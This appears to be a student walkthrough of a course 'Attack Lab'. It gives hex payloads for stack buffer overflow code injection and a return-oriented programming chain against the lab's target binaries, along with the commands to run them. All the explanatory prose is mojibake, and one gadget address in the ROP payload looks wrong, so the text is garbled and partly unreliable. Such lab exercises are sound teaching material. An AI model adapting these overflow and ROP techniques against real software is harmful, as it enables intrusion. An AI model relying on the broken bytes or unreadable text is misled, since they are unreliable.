# Attack Lab

> ğŸ¥ ç¬¬ä¸‰ç« ï¼šç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º

## Part I: Code Injection Attacks

ğŸŒ¼ ç¬¬ä¸€éƒ¨åˆ†æ²¡æœ‰æ ˆéšæœºåŒ–å’Œæ ˆonly-readé™åˆ¶

ğŸŒ éœ€è¦è¾“å…¥å­—ç¬¦ï¼Œå­—ç¬¦æ˜¯å®é™…æ³¨å…¥ä»£ç çš„ä½è¡¨ç¤º

ğŸ åœ¨è¿›è¡Œæ‰§è¡Œæ—¶åŠ ä¸Š`-qi` ï¼Œ è·³è¿‡è”ç½‘ï¼Œè¿›è¡Œæœ¬åœ°æ‰§è¡Œ



## touch1

> åœ¨getbufå‡½æ•°è°ƒç”¨åï¼Œæ‰§è¡Œtouch1å‡½æ•°ï¼Œè€Œä¸æ˜¯è¿”å›test

1. getbufè¯»å…¥å­—ç¬¦æ—¶ï¼Œ æ²¡å¯¹é•¿åº¦åšé™åˆ¶ï¼Œæ„å‘³ç€å¯ä»¥è¯»å…¥è¶…è¿‡bufSizeçš„å­—ç¬¦

2. å°†testå‡½æ•°call getbufå‡½æ•°æ—¶åœ¨æ ˆä¸Šå‹å…¥çš„retåœ°å€æ”¹ä¸ºtouch1å‡½æ•°çš„åœ°å€ï¼ˆ0x4017c0ï¼‰

3. ä½è¡¨ç¤º `bit1`

   ```text
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   c0 17 40 00 00 00 00 00
   ```

4. é€šè¿‡hex2rawå°†bitè½¬åŒ–ä¸ºå­—ç¬¦  `./hex2raw < bit1 > str1` 

5.  æ‰§è¡Œ  `./ctarget -qi str1`

## touch2

> ç›¸å¯¹äºtouch1ï¼Œ éœ€è¦ä¼ é€’ç»™touch2å‚æ•°ï¼Œ å‚æ•°ä¸ºcookieçš„å€¼

1.  ğŸˆéœ€è¦æ³¨å…¥ä»£ç ï¼Œè®©cookieå€¼ä¼ é€’ç»™%rdiå¯„å­˜å™¨

2.  ğŸ€inject code `touch2_inject_code.s`

   ```assembly
   movq $0x59b997fa, %rdi # ä¼ é€’cookie
   pushq $0x4017ec        # å…¥æ ˆtouch2å‡½æ•°çš„è¿”å›åœ°å€ 
   ret					   # æ‰§è¡Œtouch2	
   ```

3. ğŸ‚ ç¼–è¯‘inject codeï¼Œå¹¶ä¸”æŸ¥çœ‹å¯¹åº”çš„bitè¡¨ç¤º 

   ```
   gcc -c touch2_inject_code.s
   objdum -d touch2_inject_code.o
   ```

   ```
   # ç¼–è¯‘åè¡¨ç¤ºä¸º
   
   0000000000000000 <.text>:
      0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
      7:   68 ec 17 40 00          push   $0x4017ec
      c:   c3                      ret 
   ```

4.  ğŸƒå°†testå‡½æ•°çš„è¿”å›åœ°å€æ”¹ä¸ºinject codeçš„åœ°å€

5.  ğŸŒ¿inject codeçš„åœ°å€ä¸ºè¿›å…¥getbufååˆ†é…æ ˆç©ºé—´åçš„ä½ç½® ï¼ˆ0x5561dc78ï¼‰

6.  ğŸµï¸ ä½è¡¨ç¤º `bit2`

   ```
   48 c7 c7 fa 97 b9 59 68  # inject code 
   ec 17 40 00 c3 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   78 dc 61 55 00 00 00 00 # inject code rsp position
   
   ```

7. å°†ä½è¡¨ç¤ºè½¬åŒ–ä¸ºå­—ç¬¦ `./hex2raw < bit2 > str2` 

8. æ‰§è¡Œ  `./ctarget -qi str2`


## touch3

1.  ğŸˆ ç›¸å¯¹äºtouch2ï¼Œä¼ é€’å‚æ•°ä¸ºå­—ç¬¦æŒ‡é’ˆï¼ŒæŒ‡å‘cookieå­˜æ”¾çš„ä½ç½®

2.  é¿å…hexmatchå‡½æ•°çš„è°ƒç”¨æ ˆè¦†ç›–cookieæ•°ç»„çš„æ•°æ®

3.  å­—ç¬¦æ•°ç»„å­˜æ”¾åœ¨retçš„+8ä½ç½®ï¼ˆæ‰§è¡Œå®Œtouch3åç›´æ¥é€€å‡ºç¨‹åºï¼Œä¸ä¼šå½±å“å…¶ä»–ï¼‰

4.  inject code 

   ```assembly
   movq $0x5561dca8, %rdi # å­—ç¬¦æ•°ç»„ä½ç½®ï¼Œç›¸å½“äºtouch2çš„æ ˆé¡¶ä½ç½®åŠ å»0x30
   push $0x4018fa   # touch3å‡½æ•°ä½ç½®
   ret 
   ```

5. ğŸµï¸ ä½è¡¨ç¤º `bit3`

   ```
   48 c7 c7 a8 dc 61 55 68
   fa 18 40 00 c3 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   78 dc 61 55 00 00 00 00
   35 39 62 39 39 37 66 61
   ```

6. å°†ä½è¡¨ç¤ºè½¬åŒ–ä¸ºå­—ç¬¦ `./hex2raw < bit3 > str3` 

7. æ‰§è¡Œ  `./ctarget -qi str3`



## Part II: Return-Oriented Programming

> ğŸŒ¿ å…·æœ‰æ ˆéšæœºåŒ–å’Œæ ˆåªè¯»é™åˆ¶
>
> â˜˜ï¸ åªèƒ½é€šè¿‡ç¨‹åºå·²æœ‰ä»£ç æ¥è¿›è¡Œä»£ç æ”»å‡»
>
> ğŸ€ ä¸æ–­retè·³è½¬æ‰§è¡Œä»£ç ç‰‡æ®µ

### touch2

> å’Œpartâ… ä¸­touch2å®ç°çš„æ•ˆæœä¸€æ ·



 1. ğŸ‰testçš„retåœ°å€æ”¹ä¸ºç¬¬ä¸€æ®µgadgetä»£ç åœ°å€

 2. ğŸŠtestçš„retåœ°å€+8ä½ç½®ä¸º cookieçš„å€¼

 3. ğŸ‹testçš„retåœ°å€+16ä½ç½®ä¸ºç¬¬äºŒæ®µgadgetä»£ç çš„å€¼

 4. ğŸŒtestçš„retåœ°å€+24ä½ç½®ä¸ºtouch2å‡½æ•°çš„åœ°å€

 5. ğŸgadgetä»£ç ï¼Œæ ¹æ®å·²æœ‰ä»£ç å¯ä»¥çµæ´»å®ç°

    ```assembly
    popq %rax  
    ret
    
    movq %rax %rdi
    ret
    ```

 6. ğŸæ‰¾å‡ºgadgetä»£ç ä½ç½®

    ```assembly
    # bitè¡¨ç¤º 58 c3
    popq %rax  
    ret
    # bitè¡¨ç¤º  48 89 c7 c3
    movq %rax %rdi
    ret
    ```

 7. ğŸä½è¡¨ç¤º

    ```
    39 39 39 39 39 39 39 39
    39 39 39 39 39 39 39 39
    39 39 39 39 39 39 39 39
    39 39 39 39 39 39 39 39
    39 39 39 39 39 39 39 39
    cc 19 40 00 00 00 00 00 # ç¬¬ä¸€æ®µgadget
    fa 97 b9 59 00 00 00 00 # cookie
    cc 19 10 00 00 00 00 00 # ç¬¬äºŒæ®µgadget
    ec 17 40 00 00 00 00 00 # touch2
    ```

 8. ğŸå°†ä½è¡¨ç¤ºè½¬åŒ–ä¸ºå­—ç¬¦ `./hex2raw < bit4 > str4` 

9. ğŸ“æ‰§è¡Œ  `./rtarget -qi str4`

### touch3

> æš‚æ— ç²¾åŠ›ï¼Œæœ‰æœºä¼šå†æ¥

------



ç¬¬ä¸€ç‰ˆæœ¬ï¼Œå®Œæˆäº2024/04/06, ç¼ºå°‘æ¯ä¸ªtouchçš„æ ˆå›¾è¡¨ç¤º